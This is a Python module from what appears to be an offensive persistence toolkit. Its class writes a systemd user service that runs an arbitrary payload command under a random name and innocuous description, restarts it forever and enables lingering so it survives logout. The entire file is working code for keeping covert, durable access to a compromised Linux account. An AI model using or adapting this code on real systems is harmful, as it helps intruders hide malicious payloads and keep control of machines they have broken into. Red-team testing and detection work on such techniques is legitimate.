import os
from ..core import SystemdPersistence
from ..utils.helpers import run_command, generate_service_name

class UserServicePersistence(SystemdPersistence):
    def create(self, payload_command: str, service_name: str = None, description: str = None):
        service_name = service_name or generate_service_name()
        description = description or "User background service"

        service_dir = os.path.expanduser("~/.config/systemd/user")
        os.makedirs(service_dir, exist_ok=True)
        service_file = f"{service_dir}/{service_name}.service"

        content = f"""[Unit]
Description={description}
After=default.target

[Service]
Type=simple
ExecStart={payload_command}
Restart=always
RestartSec=30

[Install]
WantedBy=default.target
"""

        try:
            with open(service_file, 'w') as f:
                f.write(content)

            run_command("systemctl --user daemon-reload")
            run_command(f"systemctl --user enable {service_name}")
            run_command(f"systemctl --user start {service_name}")
            run_command(f"loginctl enable-linger {self.user}")

            print(f"[+] User service created: {service_name}")
            print(f"[+] File: {service_file}")
            print(f"[+] Lingering enabled")

            return {
                'method': 'systemd_user',
                'service_name': service_name,
                'service_file': service_file,
                'remove_command': f"systemctl --user stop {service_name}; systemctl --user disable {service_name}; rm -f {service_file}"
            }
        except Exception as e:
            print(f"[-] Error: {e}")
            return None